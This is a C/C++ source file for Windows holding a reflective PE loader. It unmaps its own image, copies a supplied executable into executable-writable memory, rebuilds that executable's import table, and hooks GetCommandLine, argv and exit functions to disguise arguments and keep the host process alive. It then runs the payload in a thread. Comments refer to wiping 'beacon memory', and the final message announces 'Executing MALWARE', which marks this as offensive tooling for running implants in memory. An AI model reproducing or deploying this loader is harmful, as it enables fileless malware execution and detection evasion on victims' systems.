#include "Commun.h"



//PE vars
BYTE* pImageBase = NULL;
IMAGE_NT_HEADERS* ntHeader = NULL;
BOOL firstTime = TRUE;


//cmdline args vars
BOOL hijackCmdline = FALSE;
char* sz_masqCmd_Ansi = NULL;
char* sz_masqCmd_ArgvAnsi[100];
wchar_t* sz_masqCmd_Widh = NULL;
wchar_t* sz_masqCmd_ArgvWidh[100];
wchar_t** poi_masqArgvW = NULL;
char** poi_masqArgvA = NULL;
int int_masqCmd_Argc = 0;
struct MemAddrs* pMemAddrs = NULL;
DWORD dwTimeout = 0;



LPWSTR hookGetCommandLineW()
{
    return sz_masqCmd_Widh;
}

LPSTR hookGetCommandLineA()
{
    return sz_masqCmd_Ansi;
}

char*** __cdecl hook__p___argv(void)
{
    return &poi_masqArgvA;
}

wchar_t*** __cdecl hook__p___wargv(void)
{

    return &poi_masqArgvW;
}

int* __cdecl hook__p___argc(void)
{
    return &int_masqCmd_Argc;
}

int hook__wgetmainargs(int* _Argc, wchar_t*** _Argv, wchar_t*** _Env, int _useless_, void* _useless)
{
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvW;

    return 0;
}

int hook__getmainargs(int* _Argc, char*** _Argv, char*** _Env, int _useless_, void* _useless)
{
    *_Argc = int_masqCmd_Argc;
    *_Argv = poi_masqArgvA;

    return 0;
}

_onexit_t __cdecl hook_onexit(_onexit_t function)
{
    return 0;
}

int __cdecl hookatexit(void(__cdecl* func)(void))
{
    return 0;
}

int __cdecl hookexit(int status)
{
    
    ExitThread(0);
    return 0;
}

void __stdcall hookExitProcess(UINT statuscode)
{
    ExitThread(0);
}
void masqueradeCmdline()
{
    //Convert cmdline to widestring
    int required_size = MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, NULL, 0);
    sz_masqCmd_Widh = (wchar_t*)calloc(required_size + 1, sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, sz_masqCmd_Ansi, -1, sz_masqCmd_Widh, required_size);

    //Create widestring array of pointers
    poi_masqArgvW = CommandLineToArgvW(sz_masqCmd_Widh, &int_masqCmd_Argc);

    //Manual function equivalent for CommandLineToArgvA
    int retval;
    int memsize = int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, NULL, 0, NULL, NULL);
        memsize += retval;
    }

    poi_masqArgvA = (LPSTR*)LocalAlloc(LMEM_FIXED, memsize);

    int bufLen = memsize - int_masqCmd_Argc * sizeof(LPSTR);
    LPSTR buffer = ((LPSTR)poi_masqArgvA) + int_masqCmd_Argc * sizeof(LPSTR);
    for (int i = 0; i < int_masqCmd_Argc; ++i)
    {
        retval = WideCharToMultiByte(CP_UTF8, 0, poi_masqArgvW[i], -1, buffer, bufLen, NULL, NULL);
        poi_masqArgvA[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }

    hijackCmdline = TRUE;
}


//This array is created manually since CommandLineToArgvA doesn't exist, so manually freeing each item in array
void freeargvA(char** array, int Argc)
{
    //Wipe cmdline args from beacon memory
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, strlen(array[i]));
    }
    LocalFree(array);
}

//This array is returned from CommandLineToArgvW so using LocalFree as per MSDN
void freeargvW(wchar_t** array, int Argc)
{
    //Wipe cmdline args from beacon memory
    for (int i = 0; i < Argc; i++)
    {
        memset(array[i], 0, wcslen(array[i]) * 2);
    }
    LocalFree(array);
}


char* GetNTHeaders(char* pe_buffer)
{
    if (pe_buffer == NULL) return NULL;

    IMAGE_DOS_HEADER* idh = (IMAGE_DOS_HEADER*)pe_buffer;
    if (idh->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    const LONG kMaxOffset = 1024;
    LONG pe_offset = idh->e_lfanew;
    if (pe_offset > kMaxOffset) return NULL;
    IMAGE_NT_HEADERS32* inh = (IMAGE_NT_HEADERS32*)((char*)pe_buffer + pe_offset);
    if (inh->Signature != IMAGE_NT_SIGNATURE) return NULL;
    return (char*)inh;
}

IMAGE_DATA_DIRECTORY* GetPEDirectory(PVOID pe_buffer, size_t dir_id)
{
    if (dir_id >= IMAGE_NUMBEROF_DIRECTORY_ENTRIES) return NULL;

    char* nt_headers = GetNTHeaders((char*)pe_buffer);
    if (nt_headers == NULL) return NULL;

    IMAGE_DATA_DIRECTORY* peDir = NULL;

    IMAGE_NT_HEADERS* nt_header = (IMAGE_NT_HEADERS*)nt_headers;
    peDir = &(nt_header->OptionalHeader.DataDirectory[dir_id]);

    if (peDir->VirtualAddress == NULL) {
        return NULL;
    }
    return peDir;
}

bool RepairIAT(PVOID modulePtr)
{
    IMAGE_DATA_DIRECTORY* importsDir = GetPEDirectory(modulePtr, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (importsDir == NULL) return false;

    size_t maxSize = importsDir->Size;
    size_t impAddr = importsDir->VirtualAddress;

    IMAGE_IMPORT_DESCRIPTOR* lib_desc = NULL;
    size_t parsedSize = 0;



    for (; parsedSize < maxSize; parsedSize += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
        lib_desc = (IMAGE_IMPORT_DESCRIPTOR*)(impAddr + parsedSize + (ULONG_PTR)modulePtr);

        if (lib_desc->OriginalFirstThunk == NULL && lib_desc->FirstThunk == NULL) break;
        LPSTR lib_name = (LPSTR)((ULONGLONG)modulePtr + lib_desc->Name);

        size_t call_via = lib_desc->FirstThunk;
        size_t thunk_addr = lib_desc->OriginalFirstThunk;
        if (thunk_addr == NULL) thunk_addr = lib_desc->FirstThunk;

        size_t offsetField = 0;
        size_t offsetThunk = 0;
        while (true)
        {
            IMAGE_THUNK_DATA* fieldThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetField + call_via);
            IMAGE_THUNK_DATA* orginThunk = (IMAGE_THUNK_DATA*)(size_t(modulePtr) + offsetThunk + thunk_addr);

            if (orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG32 || orginThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG64) // check if using ordinal (both x86 && x64)
            {
                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), (char*)(orginThunk->u1.Ordinal & 0xFFFF));
                fieldThunk->u1.Function = addr;
            }

            if (fieldThunk->u1.Function == NULL) break;

            if (fieldThunk->u1.Function == orginThunk->u1.Function) {

                PIMAGE_IMPORT_BY_NAME by_name = (PIMAGE_IMPORT_BY_NAME)((size_t)(modulePtr)+orginThunk->u1.AddressOfData);
                LPSTR func_name = (LPSTR)by_name->Name;

                size_t addr = (size_t)GetProcAddress(LoadLibraryA(lib_name), func_name);


                if (hijackCmdline && _stricmp(func_name, "GetCommandLineA") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineA;
                }
                else if (hijackCmdline && _stricmp(func_name, "GetCommandLineW") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookGetCommandLineW;
                }
                else if (hijackCmdline && _stricmp(func_name, "__wgetmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__wgetmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__getmainargs") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__getmainargs;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___wargv") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___wargv;
                }
                else if (hijackCmdline && _stricmp(func_name, "__p___argc") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hook__p___argc;
                }
                else if (hijackCmdline && (_stricmp(func_name, "exit") == 0 || _stricmp(func_name, "_Exit") == 0 || _stricmp(func_name, "_exit") == 0 || _stricmp(func_name, "quick_exit") == 0))
                {
                    fieldThunk->u1.Function = (size_t)hookexit;
                }
                else if (hijackCmdline && _stricmp(func_name, "ExitProcess") == 0)
                {
                    fieldThunk->u1.Function = (size_t)hookExitProcess;
                }
                else

                    fieldThunk->u1.Function = addr;

            }
            offsetField += sizeof(IMAGE_THUNK_DATA);
            offsetThunk += sizeof(IMAGE_THUNK_DATA);
        }
    }
    return true;
}


void PELoader(char* data, DWORD datasize){

    // Fixing command line
    sz_masqCmd_Ansi = (char*)"whatEver";

    BYTE KeyBuf[16];
    unsigned int r = 0;
    for (int i = 0; i < 16; i++) {
        rand_s(&r);
        KeyBuf[i] = (CHAR)r;

    }

    masqueradeCmdline();

    
    unsigned int chksum = 0;
    for (long long i = 0; i < datasize; i++) { chksum = data[i] * i + chksum / 3; };

    LPVOID preferAddr = 0;
    DWORD OldProtect = 0;

    IMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)GetNTHeaders(data);
    if (!ntHeader) {
        exit(0);
    }

    IMAGE_DATA_DIRECTORY* relocDir = GetPEDirectory(data, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    preferAddr = (LPVOID)ntHeader->OptionalHeader.ImageBase;


    HMODULE dll = LoadLibraryA("ntdll.dll");
    ((int(WINAPI*)(HANDLE, PVOID))GetProcAddress(dll, "NtUnmapViewOfSection"))((HANDLE)-1, (LPVOID)ntHeader->OptionalHeader.ImageBase);



    pImageBase = (BYTE*)VirtualAlloc(preferAddr, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!pImageBase) {
        if (!relocDir) {
            exit(0);
        }
        else {
            pImageBase = (BYTE*)VirtualAlloc(NULL, ntHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (!pImageBase)
            {
                exit(0);
            }
        }
    }



    // FILL the memory block with PEdata
    ntHeader->OptionalHeader.ImageBase = (size_t)pImageBase;


    memcpy(pImageBase, data, ntHeader->OptionalHeader.SizeOfHeaders);


    IMAGE_SECTION_HEADER* SectionHeaderArr = (IMAGE_SECTION_HEADER*)(size_t(ntHeader) + sizeof(IMAGE_NT_HEADERS));
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        memcpy(LPVOID(size_t(pImageBase) + SectionHeaderArr[i].VirtualAddress), LPVOID(size_t(data) + SectionHeaderArr[i].PointerToRawData), SectionHeaderArr[i].SizeOfRawData);
    }


    // Fix the PE Import addr table



    RepairIAT(pImageBase);


    // AddressOfEntryPoint
    size_t retAddr = (size_t)(pImageBase)+ntHeader->OptionalHeader.AddressOfEntryPoint;

    typedef int (*func_ptr_t)();  // Declare a function pointer type that matches the function's signature


    HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)retAddr, NULL, NULL, NULL);
    if (!hThread) {
        printf("[-] Failed in CreateThread (%u)\n", GetLastError());
        return;
    }
    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);

    printf("\n\n[+] Thread Finished Executing MALWARE\n\n");


    return;


}

